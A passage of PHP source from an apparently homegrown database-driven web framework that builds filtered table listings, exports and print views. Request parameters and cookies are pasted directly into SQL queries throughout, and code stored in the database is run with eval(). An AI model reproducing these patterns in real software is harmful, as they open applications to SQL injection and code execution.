  $conn=mysql_connect(gl(),glu(),glp());  
  $sid="";
  if (strpos($stid,"-")>0){
    $sid=qian($stid,"-");
    $sfile=qian(hou($stid,"sfile:"),"-");
    $spage=qian(hou($stid,"pnum:"),"-");
  }else{
    $sid=$stid;
    $sfile="";
    $spage=$_GET["pagenum"].$_GET["pnum"];
  };
  if ($pagenum=="" and _get("pnu")!="0"){
    $pagenum=$spage;
  };
 $conn=mysql_connect(gl(),glu(),glp());
 $bfval=selecteds($conn,glb(),"select TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME,keytitle,keyexplain,clstxt,jsshowfun,jspostfun,sysshowfun,syspostfun,dxtype from coode_keydetaily where shortid='".$sid."'","utf8","");  
 $conn=mysql_connect(gl(),glu(),glp());
 $rst=selectedx($conn,glb(),"select tablename,showkeys,hdata,cdt,orddt,fileurl,showfile,dttp,PTOF,STCODE,allkeys from coode_shortdata where shortid='".$sid."'","utf8","");
 // echo $rst;
 $totrst=countresult($rst);
 if ($totrst>0){  
  $tbnmm=anyvalue($rst,"tablename",0);
  $tbkiss=anyvalue($rst,"showkeys",0);
  $kothern=anyvalue($rst,"STCODE",0);
  $aks=anyvalue($rst,"allkeys",0);
  $enaks=hou($aks,"|");
   $hdata=anyvalue($rst,"hdata",0);
   $dtpp=anyvalue($rst,"dttp",0);
   $dtp=$_GET["datatype"];
   $d=$_GET["down"];
   $p=$_GET["print"];
   if ($dtp!="" and $dtpp!="clstxt"){
     $dtpp=str_replace("[","",$dtp);
     $dtpp=str_replace("]","",$dtpp);
   }; 

if ($dtpp=="clstxt"){//这样形式的只能有两个字段选项;
   $fmcdt="";
    $wtokiss=$_GET['wtokeys'];
    if ($wtokiss==""){
      $wtokiss=$hdata;
    };
    $tbcdtss=anyvalue($rst,"cdt",0);
    $surll=glw();
    $odcdt=anyvalue($rst,"orddt",0);
    if (strpos($stid,"headc")>0){
     $theadc="/theadc";
    };
    if (strpos($odcdt,"TYPE_HEX")>0){
     $odcdt=Hex2String(hou($odcdt,"TYPE_HEX:"));
    };
    if ($sfile==""){    
      $showf=anyvalue($rst,"showfile",0);
    }else{
      $showf=$sfile;
    }  

}else{
  
 $bfview=UX("select beforeview as result from coode_tablist where TABLE_NAME='".$tbnmm."'");
    if ($bfview!=""){
     eval(tostring($bfview));
    };
    if (strpos($tbkiss,"TYPE_HEX")>0){
     $tbkiss=Hex2String(hou($tbkiss,"TYPE_HEX:"));
    };  
    $sqlxxx="TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME,ORDINAL_POSITION,COLUMN_DEFAULT,IS_NULLABLE,DATA_TYPE,CHARACTER_MAXIMUM_LENGTH,CHARACTER_OCTET_LENGTH,NUMERIC_PRECISION,NUMERIC_SCALE,DATETIME_PRECISION,CHARACTER_SET_NAME,COLLATION_NAME,COLUMN_TYPE,COLUMN_KEY,EXTRA,PRIVILEGES,COLUMN_COMMENT,CRTM,OLMK,PTOF,classp,keytitle,keyexplain,UPTM,clstxt,dxtype,jsshowfun,sysshowfun,jspostfun,syspostfun,changeable,bfist,aftist,bfupd,aftupd,bfdel,aftdel,acthtml,atnhtml,displayed,SQX";
    $conn=mysql_connect(gl(),glu(),glp());
    $sqlm="insert into coode_keydetaily(".$sqlxxx.",shortid)select ".$sqlxxx.",'".$sid."' from coode_keydetailx where TABLE_NAME='".$tbnmm."' and '".$tbkiss.",' like concat('%',COLUMN_NAME,',%') and concat('".$sid."',TABLE_NAME,COLUMN_NAME) not in (select concat(shortid,TABLE_NAME,COLUMN_NAME) from coode_keydetaily)";
    //一句话复制x 到 y 的short信息
    $xn=updatingx($conn,glb(),$sqlm,"utf8");
    $conn=mysql_connect(gl(),glu(),glp());//一句话增加表格名称
    $prix=updatingx($conn,glb(),"select SNO as result from coode_keydetaily where shortid='".$sid."' and COLUMN_NAME='SNO'","utf8");
    $conn=mysql_connect(gl(),glu(),glp());//一句话增加表格名称
    $nprx=updatingx($conn,glb(),"update coode_keydetaily set PRIME='".($prix-1)."',SQX=SNO-".($prix-1).",VQX=SNO-".($prix-1).",dxtype=DATA_TYPE,displayed=1 where shortid='".$sid."' and SQX=0 ","utf8");
    $killy=UX("delte from coode_keydetaily where COLUMN_NAME=''");
    $conn=mysql_connect(gl(),glu(),glp());  
    $conn=mysql_connect(gl(),glu(),glp());
    $aftval=selecteds($conn,glb(),"select TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME,keytitle,keyexplain,clstxt,jsshowfun,jspostfun,sysshowfun,syspostfun,dxtype from coode_keydetaily where shortid='".$sid."'","utf8","");  
    if ($bfval!=$aftval){  
      $sttt=atv("(coode_shortdata@shortid='".$sid."').shorttitle");
      $bid=onlymark();
      $upmark=getRandChar(6);
      $conn=mysql_connect(gl(),glu(),glp());
      $ntbup=updatings($conn,glb(),"insert into coode_updatetable(schm,shortid,tablename,optime,beforefrm,afterfrm,CRTM,CRTOR,UPTM,RIP,billid,upmark)values('".glb()."','".$sid."','".$tbnmm."',now(),'".$bfval."','".$aftval."',now(),'".$_COOKIE["uid"]."',now(),'".getip()."','".$bid."','".$upmark."')","utf8");
      eval(CLASSX("tablediff"));
      $td=new tablediff();
      $tarr=$td->difftab($bfval,$aftval,$tarr);
      eval(CLASSX("anychange"));
      $ac=new anychange();
      $hrst=SX("select sysid,appid,pagemark from coode_pagesrc where sourceid='".$sid."'");
      $toth=countresult($hrst);
      if ($toth>0){
        for ($k=0;$k<$toth;$k++){
          $hatxt=$ac->srcchange($shortid,"tab",anyvalue($hrst,"sysid",$k),anyvalue($hrst,"appid",$k),anyvalue($hrst,"pagemark",$k),$bid,$tarr);
        }
      }else{
         $hatxt=$ac->srcchange($shortid,"tab","coode","anyapp","anypage",$bid,$tarr);
      }
      $ctx=UX("select sum(newchara-killchara) as result from coode_pagedevelop where newaction='UPDATEtab-".$sid."'");
      $zx=UX("update coode_pagesrc set sourcelong='.$ctx.' where sourceid='".$sid."' and sourcecls='short'");
    };
    $wtokiss=$_GET['wtokeys'];
    if ($wtokiss==""){
      $wtokiss=$hdata;
    };
    $tbcdtss=anyvalue($rst,"cdt",0);
    $surll=glw();
    $odcdt=anyvalue($rst,"orddt",0);
    if (strpos($stid,"headc")>0){
     $theadc="/theadc";
    };
    if (strpos($odcdt,"TYPE_HEX")>0){
     $odcdt=Hex2String(hou($odcdt,"TYPE_HEX:"));
    };
    if ($sfile==""){    
      $showf=anyvalue($rst,"showfile",0);
    }else{
      $showf=$sfile;
    }  
      $qry=unstrs($_GET["qry"]);
      if ($qry==""){
         $qry=unstrs($_POST["skey"]);
      }
      $qrl="";
      $val="";
      $xkey=$_GET["xkey"];
      $xval=$_GET["xval"];
      if (strpos($page,":")>0){
        $qrl=hou($page,":");
        $page=qian($page,":");
      }; 
      if (strpos($pagenum,":")>0){
        $val=hou($pagenum,":");
        $pagenum=qian($pagenum,":");
      };
       $fmbdt="";
       $fmcdt="";
       $fmsdt="";
      if ($val!=""){
        if (substr($qrl,0,1)=="@"){
          $fmbdt=" ".hou($qrl,"@")." like '%".$val."%' ";      
        }else{
          $fmbdt=" ".$qrl."='".$val."' ";  
        };
      }//$val 
      if ($xkey!="" and $qry=="" ){
        $ptxk=explode("/",$xkey);
        $totpx=count($ptxk);
        $fmccc="";
        $sc=_get("sc");
        if ($sc=="9"){
           $kaishi=1;
           $jieshu=7;
         }else{
           $kaishi=0;
           $jieshu=1;
         }
         for ($s=$kaishi;$s<$jieshu;$s++){      
            $tmpdd="";
            for ($t=0;$t<$totpx-1;$t++){
             $qkk=qian($ptxk[$t],":");
             $qtp=hou($ptxk[$t],":");
             switch ($qtp){
               case "varchar":
               if (qian(hou($xval,"q_".$qkk.$s.":"),"/")!=""){
                   $tmpdd=$tmpdd." ".$qkk." like '%".qian(hou($xval,"q_".$qkk.$s.":"),"/")."%' and ";
               }
               break;
               case "text":
               if (qian(hou($xval,"q_".$qkk.$s.":"),"/")!=""){
                   $tmpdd=$tmpdd." ".$qkk." like '%".qian(hou($xval,"q_".$qkk.$s.":"),"/")."%' and ";
               }
               break;
               case "date":
               if (qian(hou($xval,"qa_".$qkk.$s.":"),"/")!="" and qian(hou($xval,"qb_".$qkk.$s.":"),"/")!=""){
                  $tmpdd=$tmpdd." timestampdiff(second,'".qian(hou($xval,"qa_".$qkk.$s.":"),"/")."',".$qkk.")>=0 and   timestampdiff(second,".$qkk.",'".qian(hou($xval,"qb_".$qkk.$s.":"),"/")."')>=0 and ";
               }else if (qian(hou($xval,"qa_".$qkk.$s.":"),"/")!=""){
                  $tmpdd=$tmpdd." timestampdiff(second,'".qian(hou($xval,"qa_".$qkk.$s.":"),"/")."',".$qkk.")>=0  and ";
               }else{
                  $tmpdd=$tmpdd." timestampdiff(second,".$qkk.",'".qian(hou($xval,"qb_".$qkk.$s.":"),"/")."')>=0 and ";
               }
               break;
               case "datetime":
               if (qian(hou($xval,"qa_".$qkk.$s.":"),"/")!="" and qian(hou($xval,"qb_".$qkk.$s.":"),"/")!=""){
                 $tmpdd=$tmpdd." timestampdiff(second,'".qian(hou($xval,"qa_".$qkk.$s.":"),"/")."',".$qkk.")>=0 and   timestampdiff(second,".$qkk.",'".qian(hou($xval,"qb_".$qkk.$s.":"),"/")."')>=0 and ";
               }else if (qian(hou($xval,"qa_".$qkk.$s.":"),"/")!=""){
                 $tmpdd=$tmpdd." timestampdiff(second,'".qian(hou($xval,"qa_".$qkk.$s.":"),"/")."',".$qkk.")>=0  and ";
               }else{
                 $tmpdd=$tmpdd." timestampdiff(second,".$qkk.",'".qian(hou($xval,"qb_".$qkk.$s.":"),"/")."')>=0 and ";
               }
              break;
              case "tinyint":
              if (qian(hou($xval,"qa_".$qkk.$s.":"),"/")!="" and qian(hou($xval,"qb_".$qkk.$s.":"),"/")!=""){
                $tmpdd=$tmpdd." ".$qkk.">=".(qian(hou($xval,"qa_".$qkk.$s.":"),"/")*1)." and ".$qkk."<=".(qian(hou($xval,"qb_".$qkk.$s.":"),"/")*1)." and ";
              }else if (qian(hou($xval,"qa_".$qkk.$s.":"),"/")!=""){
                $tmpdd=$tmpdd." ".$qkk.">=".(qian(hou($xval,"qa_".$qkk.$s.":"),"/")*1)."  and ";
              }else{
                $tmpdd=$tmpdd." ".$qkk."<=".(qian(hou($xval,"qb_".$qkk.$s.":"),"/")*1)." and ";
              }
              break;
              case "int":
              if (qian(hou($xval,"qa_".$qkk.$s.":"),"/")!="" and qian(hou($xval,"qb_".$qkk.$s.":"),"/")!=""){
                $tmpdd=$tmpdd." ".$qkk.">=".(qian(hou($xval,"qa_".$qkk.$s.":"),"/")*1)." and ".$qkk."<=".(qian(hou($xval,"qb_".$qkk.$s.":"),"/")*1)." and ";
              }else if (qian(hou($xval,"qa_".$qkk.$s.":"),"/")!=""){
                $tmpdd=$tmpdd." ".$qkk.">=".(qian(hou($xval,"qa_".$qkk.$s.":"),"/")*1)."  and ";
              }else{
                $tmpdd=$tmpdd." ".$qkk."<=".(qian(hou($xval,"qb_".$qkk.$s.":"),"/")*1)." and ";
              }
              break; 
              case "decimal":
              if (qian(hou($xval,"qa_".$qkk.$s.":"),"/")!="" and qian(hou($xval,"qb_".$qkk.$s.":"),"/")!=""){
                $tmpdd=$tmpdd." ".$qkk.">=".(qian(hou($xval,"qa_".$qkk.$s.":"),"/")*1)." and ".$qkk."<=".(qian(hou($xval,"qb_".$qkk.$s.":"),"/")*1)." and ";
              }else if (qian(hou($xval,"qa_".$qkk.$s.":"),"/")!=""){
                $tmpdd=$tmpdd." ".$qkk.">=".(qian(hou($xval,"qa_".$qkk.$s.":"),"/")*1)."  and ";
              }else{
                $tmpdd=$tmpdd." ".$qkk."<=".(qian(hou($xval,"qb_".$qkk.$s.":"),"/")*1)." and ";
              }
              break;
              case "float":
              if (qian(hou($xval,"qa_".$qkk.$s.":"),"/")!="" and qian(hou($xval,"qb_".$qkk.$s.":"),"/")!=""){
                $tmpdd=$tmpdd." ".$qkk.">=".(qian(hou($xval,"qa_".$qkk.$s.":"),"/")*1)." and ".$qkk."<=".(qian(hou($xval,"qb_".$qkk.$s.":"),"/")*1)." and ";
              }else if (qian(hou($xval,"qa_".$qkk.$s.":"),"/")!=""){
                $tmpdd=$tmpdd." ".$qkk.">=".(qian(hou($xval,"qa_".$qkk.$s.":"),"/")*1)."  and ";
              }else{
                $tmpdd=$tmpdd." ".$qkk."<=".(qian(hou($xval,"qb_".$qkk.$s.":"),"/")*1)." and ";
              }
              break;
              default:
              if (qian(hou($xval,"q_".$qkk.$s.":"),"/")!=""){
                $tmpdd=$tmpdd." ".$qkk." like '%".qian(hou($xval,"q_".$qkk.$s.":"),"/")."%' and ";
              }            
            }//swithch                
          }//for t          
          if ($tmpdd!=""){
           $tmpdd=substr($tmpdd,0,strlen($tmpdd)-4);
           $fmccc=$fmccc."(".$tmpdd.") or ";
          }else{
          }
       }//fors         
       if ($fmccc!=""){
          $fmccc=substr($fmccc,0,strlen($fmccc)-4);
          $fmsdt=" (".$fmccc.") ";                                        
        };
    }else{
     $tmpdd="";
     $tmpdd=$tmpdd.formdcdt($enaks,$kothern);
     if ($tmpdd!=""){
       $tmpdd=substr($tmpdd,0,strlen($tmpdd)-4);       
     }else{       
     }    
     if ($qry!=""){
       if ($tmpdd!=""){
        $fmsdt="( concat(".$tbkiss.") like '%".$qry."%') and (".$tmpdd.")";
       }else{
         $fmsdt=" concat(".$tbkiss.") like '%".$qry."%' ";
       }
       
     }else{
       if ($tmpdd!=""){
        $fmsdt=" (".$tmpdd.") ";
       }else{
         $fmsdt="";
       };         
     };    
   };//if qry  xkey    
  
   if ($fmbdt!="" and $fmsdt!=""){
     $fmcdt=$fmbdt." and ".$fmsdt;
   }else{
    $fmcdt=$fmbdt.$fmsdt;
   }  
}
    
  
  //echo "-----------".$fmcdt;

//echo "select ".$tbkiss." from ".$tbnmm." where ".$tbcdtss.$odcdt;

 if ($dtpp=="clstxt"){//这样形式的只能有两个字段选项;
   $ptkeys=explode(",",$tbkiss);
   $totpt=count($ptkeys);
      if ($fmcdt==""){
        $fmcdt=" 1>0 ";
      };
      if (strlen($tbcdtss)>5){
        if(strpos($tbcdtss,"like")<=0 and strpos($tbcdtss,"=")<=0 and strpos($tbcdtss,"by")<=0){
         $tbcdtss=Hex2String($tbcdtss)." and ".$fmcdt; //未发现说面加密了,需要解密,否则不用解密
        }else{
         $tbcdtss=$tbcdtss." and ".$fmcdt;        
        };
      }else{        
         $tbcdtss=$fmcdt;        
      };

      if ($totpt==2){
        $conn=mysql_connect(gl(),glu(),glp());
        $grp=atv("(coode_sysdefault@companyid='".$_COOKIE["cid"]."').groupid");
        $tbcdtss=str_replace("[grp]",$grp,$tbcdtss);
        $tbcdtss=str_replace("[pme]",$_COOKIE["pme"],$tbcdtss);
		$tbcdtss=str_replace("[rids]",$_COOKIE["rids"],$tbcdtss);
		$tbcdtss=str_replace("[pids]",$_COOKIE["pids"],$tbcdtss);
		$tbcdtss=str_replace("[uid]",$_COOKIE["uid"],$tbcdtss);
        $tbcdtss=str_replace("[cid]",$_COOKIE["cid"],$tbcdtss);
        $tbcdtss=str_replace("[thissysid]",atv("(coode_sysdefault@syskey='service' and companyid='".$_COOKIE["cid"]."').keyval"),$tbcdtss);
		$tbcdtss=str_replace("[date]",date("Y-m-d"),$tbcdtss);
		$tbcdtss=str_replace("[now]",date("Y-m-d H:i:s"),$tbcdtss);
        $ptnhtxt=explode("[get-",$tbcdtss);
        $totpt=count($ptnhtxt);
        for ($f=0;$f<$totpt;$f++){
          $tmpok=qian($ptnhtxt[$f],"]");
          $tbcdtss=str_replace("[get-".$tmpok."]",$_GET[$tmpok],$tbcdtss);     
        };         
        $ptnhtxt=explode("[post-",$tbcdtss);
        $totpt=count($ptnhtxt);
        for ($f=0;$f<$totpt;$f++){
          $tmpok=qian($ptnhtxt[$f],"]");
          $tbcdtss=str_replace("[post-".$tmpok."]",$_POST[$tmpok],$tbcdtss);     
        };
        $ptnhtxt=explode("[cookie-",$tbcdtss);
        $totpt=count($ptnhtxt);
        for ($f=0;$f<$totpt;$f++){
          $tmpok=qian($ptnhtxt[$f],"]");
          $tbcdtss=str_replace("[cookie-".$tmpok."]",$_COOKIE[$tmpok],$tbcdtss);     
        };
		$tbcdtss=str_replace("[anymark]",date("YmdHis").getRandChar(6),$tbcdtss);        
        
        $charax=$sid.$tbcdtss.$odcdt;
        $charax=str_replace(" ","",$charax);
        $charax=str_replace("'","",$charax);
        $charax=str_replace("'","",$charax);
        $charax=str_replace("=","eq",$charax);
        $charax=str_replace(">","gr",$charax);
        $charax=str_replace("<","le",$charax);
        $charax=str_replace("%","0",$charax);
        $tmpsession="";
        $tmpsession=$_SESSION[$charax];
        if ($tmpsession!="" and $_GET["new"]!="1"){                    
          return $tmpsession;
        }else{          
          $dtrst=SX("select ".$tbkiss." from ".$tbnmm." where ".$tbcdtss.$odcdt); 
          //echo "select ".$tbkiss." from ".$tbnmm." where ".$tbcdtss.$odcdt;
          $totrst=countresult($dtrst);
         if ($totrst>0){
          $arrdt=arrdata($arrdt,$dtrst);//arrdata()返回 的数组是 arrdata['key'][1~ToTrst]
          $tmpvk="";   //这里不是KEY存在的,而是两个数据当成K|V形态
          $tmpvv="";
          for ($i=1;$i<=$totrst;$i++){
           $tmpvk=$tmpvk.$arrdt[qian($tbkiss,",")][$i].",";
           $tmpvv=$tmpvv.$arrdt[hou($tbkiss,",")][$i].",";
          };
           $tmpvk=substr($tmpvk,0,strlen($tmpvk)-1);
           $tmpvv=substr($tmpvv,0,strlen($tmpvv)-1);
           $fmtmpvs=$tmpvk."|".$tmpvv;           
           $_SESSION[$charax]=$fmtmpvs;
           return $fmtmpvs;
         }else{
          //return "NoSuchData,select ,".$tbkiss.", from ,".$tbnmm.", where ,".$tbcdtss.",".$odcdt."|NoSuchData,select ,".$tbkiss.", from ,".$tbnmm.", where ,".$tbcdtss.",".$odcdt;
          return "";
         };
        }

     }else{
        //return "Beyond, or Less, Two Keys, at clstxt, fun|"."Beyond, or Less, Two Keys, at clstxt, fun";
        return "";
     };//tot =2
  
   }else{//html or other----------------------------------
       if ($fmcdt==""){
        $fmcdt=" 1>0 ";
       };
      if (strlen($tbcdtss)>5){
        if(strpos($tbcdtss,"like")<=0 and strpos($tbcdtss,"=")<=0 and strpos($tbcdtss,"by")<=0){
         $tbcdtss=Hex2String($tbcdtss)." and ".$fmcdt; //未发现说面加密了,需要解密,否则不用解密
        }else{
         $tbcdtss=$tbcdtss." and ".$fmcdt;        
        };
      }else{        
         $tbcdtss=$fmcdt;        
      };


       $fbss=$_GET["cssmark"];
       if (intval($pagenum)*1==0){
       // echo "before anyfull";
         //echo "tbcdtss--".$tbcdtss;
         
         //echo "tbcdts2s--".$tbcdtss;
        $grp=atv("(coode_sysdefault@companyid='".$_COOKIE["cid"]."').groupid");
        $tbcdtss=str_replace("[grp]",$grp,$tbcdtss);
        $tbcdtss=str_replace("[pme]",$_COOKIE["pme"],$tbcdtss);
	    $tbcdtss=str_replace("[rids]",$_COOKIE["rids"],$tbcdtss);
         $tbcdtss=str_replace("[pids]",$_COOKIE["pids"],$tbcdtss);
		$tbcdtss=str_replace("[uid]",$_COOKIE["uid"],$tbcdtss);
         $tbcdtss=str_replace("[cid]",$_COOKIE["cid"],$tbcdtss);
         $tbcdtss=str_replace("[thissysid]",atv("(coode_sysdefault@syskey='service' and companyid='".$_COOKIE["cid"]."').keyval"),$tbcdtss);
		$tbcdtss=str_replace("[date]",date("Y-m-d"),$tbcdtss);
		$tbcdtss=str_replace("[now]",date("Y-m-d H:i:s"),$tbcdtss);
        $ptnhtxt=explode("[get-",$tbcdtss);
   $totpt=count($ptnhtxt);
   for ($f=0;$f<$totpt;$f++){
      $tmpok=qian($ptnhtxt[$f],"]");
      $tbcdtss=str_replace("[get-".$tmpok."]",$_GET[$tmpok],$tbcdtss);     
   };         
   $ptnhtxt=explode("[post-",$tbcdtss);
   $totpt=count($ptnhtxt);
   for ($f=0;$f<$totpt;$f++){
      $tmpok=qian($ptnhtxt[$f],"]");
      $tbcdtss=str_replace("[post-".$tmpok."]",$_POST[$tmpok],$tbcdtss);     
   };
  $ptnhtxt=explode("[cookie-",$tbcdtss);
   $totpt=count($ptnhtxt);
   for ($f=0;$f<$totpt;$f++){
      $tmpok=qian($ptnhtxt[$f],"]");
      $tbcdtss=str_replace("[cookie-".$tmpok."]",$_COOKIE[$tmpok],$tbcdtss);     
   };
  $tbcdtss=str_replace("[anymark]",date("YmdHis").getRandChar(6),$tbcdtss);      
         if (_get("SNO")!=""){
           $tbcdtss=" SNO="._get("SNO")." ";
         };
         if ($d=="1"){
           $tbdld=anyfulltblist($showf,"","",$fpss,$fbss,$tbnmm,$tbkiss,$tbcdtss,"excel",$surll,$odcdt);
           $fnmx=onlymark().".xls";
           $pathx=localroot()."ORG/BRAIN/files/".$tbnmm;
           is_dir($pathx) OR mkdir($pathx, 0777, true); 
           $fpath=$pathx."/".$fnmx;
           $tbdld=str_replace("[tab]","	",$tbdld);
           $tbdld=str_replace("-r-n","\r\n",$tbdld);
           overfile($fpath,$tbdld);
           $upath=str_replace(localroot(),"/",$fpath);
           return $upath;
         }else{
            if ($p=="1"){
              $phtml=anyfulltblist($showf,"","",$fpss,$fbss,$tbnmm,$tbkiss,$tbcdtss,"print",$surll,$odcdt);
              return $phtml;
            }else{
              $x=anyfulltblist($showf,"",$hdata,$fpss,$fbss,$tbnmm,$tbkiss,$tbcdtss,$dtpp,$surll,$odcdt);
              return $x;
            };
         };
       }else{
          $grp=atv("(coode_sysdefault@companyid='".$_COOKIE["cid"]."').groupid");
          $tbcdtss=str_replace("[grp]",$grp,$tbcdtss);
          $tbcdtss=str_replace("[pme]",$_COOKIE["pme"],$tbcdtss);
          $tbcdtss=str_replace("[rids]",$_COOKIE["rids"],$tbcdtss);
          $tbcdtss=str_replace("[pids]",$_COOKIE["pids"],$tbcdtss);
		  $tbcdtss=str_replace("[uid]",$_COOKIE["uid"],$tbcdtss);
          $tbcdtss=str_replace("[cid]",$_COOKIE["cid"],$tbcdtss);
         $tbcdtss=str_replace("[thissysid]",atv("(coode_sysdefault@syskey='service' and companyid='".$_COOKIE["cid"]."').keyval"),$tbcdtss);
		  $tbcdtss=str_replace("[date]",date("Y-m-d"),$tbcdtss);
		  $tbcdtss=str_replace("[now]",date("Y-m-d H:i:s"),$tbcdtss);
        $ptnhtxt=explode("[get-",$tbcdtss);
   $totpt=count($ptnhtxt);
   for ($f=0;$f<$totpt;$f++){
      $tmpok=qian($ptnhtxt[$f],"]");
      $tbcdtss=str_replace("[get-".$tmpok."]",$_GET[$tmpok],$tbcdtss);     
   };         
   $ptnhtxt=explode("[post-",$tbcdtss);
   $totpt=count($ptnhtxt);
   for ($f=0;$f<$totpt;$f++){
      $tmpok=qian($ptnhtxt[$f],"]");
      $tbcdtss=str_replace("[post-".$tmpok."]",$_POST[$tmpok],$tbcdtss);     
   };
  $ptnhtxt=explode("[cookie-",$tbcdtss);
   $totpt=count($ptnhtxt);
   for ($f=0;$f<$totpt;$f++){
      $tmpok=qian($ptnhtxt[$f],"]");
      $tbcdtss=str_replace("[cookie-".$tmpok."]",$_COOKIE[$tmpok],$tbcdtss);     
   };
		$tbcdtss=str_replace("[anymark]",date("YmdHis").getRandChar(6),$tbcdtss);
         if (_get("SNO")!=""){
           $tbcdtss=" SNO="._get("SNO")." ";
         };
          //echo "------------------------a".$showf,"","",$fpss,$fbss,$tbnmm,$tbkiss,$wtokiss,$tbcdtss,$dtpp,$surll,$page,$pagenum,$odcdt;
          if ($d=="1"){
           $tbdld=anyfulltblist($showf,"","",$fpss,$fbss,$tbnmm,$tbkiss,$tbcdtss,"excel",$surll,$odcdt);
           $fnmx=onlymark().".xls";
           $pathx=str_replace("\\","/",$_SERVER['DOCUMENT_ROOT'])."/"."ORG/BRAIN/files/".$tbnmm;
           $tbdld=str_replace("[tab]","	",$tbdld);
           $tbdld=str_replace("-r-n","\r\n",$tbdld);
           $g=createdir($pathx); 
           $fpath=$pathx."/".$fnmx;
            //echo $fpath;
           $dx=overfile($fpath,$tbdld);
            $upath=str_replace(localroot(),"/",$fpath);
           return $upath;
          }else{
           if ($p=="1"){
              $phtml=anyfulltblist($showf,"","",$fpss,$fbss,$tbnmm,$tbkiss,$tbcdtss,"print",$surll,$odcdt);
              return $phtml;
           }else{                
             $x=anypagetblist($showf,"","",$fpss,$fbss,$tbnmm,$tbkiss,$wtokiss,$tbcdtss,$dtpp,$surll,$page,$pagenum,$odcdt);
             return $x;
           };
          };
       };
   };//
 }else{
 };//totrst
}//function
function anyshortx($stid,$page,$pagenum,$cmk){
  $page=str_replace("undefined","1",$page);
  $pagenum=str_replace("undefined","30",$pagenum);
  $conn=mysql_connect(gl(),glu(),glp());
  $sid="";
  if (strpos($stid,"-")>0){
    $sid=qian($stid,"-");
    $sfile=qian(hou($stid,"sfile:"),"-");
    $spage=qian(hou($stid,"pnum:"),"-");
  }else{
    $sid=$stid;
    $sfile="";
    $spage=$_GET["pagenum"].$_GET["pnum"];
  };
  if ($pagenum==""){
    $pagenum=$spage;
  };
  
$rst=selectedx($conn,glb(),"select tablename,showkeys,hdata,cdt,orddt,fileurl,showfile,dttp,PTOF from coode_shortdata where shortid='".$sid."'","utf8","");
// echo $rst;
$totrst=countresult($rst);
if ($totrst>0){
 $tbnmm=anyvalue($rst,"tablename",0);
 $tbkiss=anyvalue($rst,"showkeys",0);
  $hdata=anyvalue($rst,"hdata",0);
 if (strpos($tbkiss,"TYPE_HEX")>0){
  $tbkiss=Hex2String(hou($tbkiss,"TYPE_HEX:"));
 };
  $sqlxxx="TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME,ORDINAL_POSITION,COLUMN_DEFAULT,IS_NULLABLE,DATA_TYPE,CHARACTER_MAXIMUM_LENGTH,CHARACTER_OCTET_LENGTH,NUMERIC_PRECISION,NUMERIC_SCALE,DATETIME_PRECISION,CHARACTER_SET_NAME,COLLATION_NAME,COLUMN_TYPE,COLUMN_KEY,EXTRA,PRIVILEGES,COLUMN_COMMENT,CRTM,OLMK,PTOF,classp,keytitle,keyexplain,UPTM,clstxt,dxtype,jsshowfun,sysshowfun,jspostfun,syspostfun,changeable,bfist,aftist,bfupd,aftupd,bfdel,aftdel,acthtml,atnhtml,displayed,SQX";
  $conn=mysql_connect(gl(),glu(),glp());
  $sqlm="insert into coode_keydetaily(".$sqlxxx.",shortid)select ".$sqlxxx.",'".$sid."' from coode_keydetailx where TABLE_NAME='".$tbnmm."' and '".$tbkiss.",' like concat('%',COLUMN_NAME,',%') and concat('".$sid."',TABLE_NAME,COLUMN_NAME) not in (select concat(shortid,TABLE_NAME,COLUMN_NAME) from coode_keydetaily)";
  //一句话复制x 到 y 的short信息
  $xn=updatingx($conn,glb(),$sqlm,"utf8");
   $conn=mysql_connect(gl(),glu(),glp());//一句话增加表格名称
  $prix=updatingx($conn,glb(),"select SNO as result from coode_keydetaily where shortid='".$sid."' and COLUMN_NAME='SNO'","utf8");
  $conn=mysql_connect(gl(),glu(),glp());//一句话增加表格名称
  $nprx=updatingx($conn,glb(),"update coode_keydetaily set PRIME='".($prix-1)."',SQX=SNO-".($prix-1).",dxtype=DATA_TYPE,displayed=1 where shortid='".$sid."' and SQX=0 ","utf8");
  $conn=mysql_connect(gl(),glu(),glp());//一句话增加表格名称
  $nprx=updatingx($conn,glb(),"update coode_keydetaily set displayed=1 where shortid='".$sid."'  ","utf8");
  $z=UX("delete from coode_keydetaily where COLUMN_NAME=''");
   $wtokiss=$_GET['wtokeys'];
     if ($wtokiss==""){
       $wtokiss=$hdata;
      };
      $tbcdtss=anyvalue($rst,"cdt",0);
      $surll=glw();
      $odcdt=anyvalue($rst,"orddt",0);
       if (strpos($stid,"headc")>0){
        $theadc="/theadc";
       };
       if (strpos($odcdt,"TYPE_HEX")>0){
        $odcdt=Hex2String(hou($odcdt,"TYPE_HEX:"));
       };
        if ($sfile==""){    
         $showf=anyvalue($rst,"showfile",0);
        }else{
         $showf=$sfile;
        }
      $qry=unstrs($_GET["qry"]);
      if ($qry==""){
         $qry=unstrs($_POST["skey"]);
      }
      $qrl="";
      $val="";
      $xkey=$_GET["xkey"];
      $xval=$_GET["xval"];
      if (strpos($page,":")>0){
        $qrl=hou($page,":");
        $page=qian($page,":");
      }; 
      if (strpos($pagenum,":")>0){
        $val=hou($pagenum,":");
        $pagenum=qian($pagenum,":");
      };
       $fmbdt="";
       $fmcdt="";
       $fmsdt="";
      if ($val!=""){
        if (substr($qrl,0,1)=="@"){
          $fmbdt=" ".hou($qrl,"@")." like '%".$val."%' ";      
        }else{
          $fmbdt=" ".$qrl."='".$val."' ";  
        };
      }//$val 
     $fmsdt="";
    if ($qry!=""){
       if ($tmpdd!=""){
        $fmsdt="( concat(".$tbkiss.") like '%".$qry."%') and (".$tmpdd.")";
       }else{
         $fmsdt=" concat(".$tbkiss.") like '%".$qry."%' ";
       }
       
     }else{
       if ($tmpdd!=""){
        $fmsdt=" (".$tmpdd.") ";
       }else{
         $fmsdt="";
       };         
     };    
      if ($fmbdt!="" and $fmsdt!=""){
        $fmcdt=$fmbdt." and ".$fmsdt;
      }else{
        $fmcdt=$fmbdt.$fmsdt;
      }  
      if ($fmcdt==""){
      }else{
       $tbcdtss=$fmcdt;
      };
       if (intval($pagenum)*1==0){
	     $tbcdtss=str_replace("[rids]",$_COOKIE["rids"],$tbcdtss);
		 $tbcdtss=str_replace("[uid]",$_COOKIE["uid"],$tbcdtss);
         $tbcdtss=str_replace("[cid]",$_COOKIE["cid"],$tbcdtss);
		 $tbcdtss=str_replace("[date]",date("Y-m-d"),$tbcdtss);
